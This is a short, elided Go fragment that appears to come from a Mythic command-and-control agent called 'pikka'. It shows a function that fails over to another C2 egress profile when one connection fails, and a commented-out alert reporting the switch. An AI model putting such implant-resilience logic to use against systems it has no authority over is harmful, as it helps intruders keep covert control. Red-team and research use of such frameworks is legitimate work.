...
import (
	...
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/functions"
...
func StartNextEgress(failedConnectionC2Profile string) {
	...
	if GetMythicID() != "" && startedC2 != "" && startedC2 != failedConnectionC2Profile {
		...
		/*
			source := fmt.Sprintf("pikka: %s", GetMythicID())
			level := structs.AlertLevelInfo
			utils.PrintDebug("adding alert to NewAlertChannel")
			responses.NewAlertChannel <- structs.Alert{
				Alert:  fmt.Sprintf("pikka, %s, Stopped C2 Profile '%s' and started '%s'", GetMythicID(), failedConnectionC2Profile, startedC2),
				Source: &source,
				Level:  &level,
			}
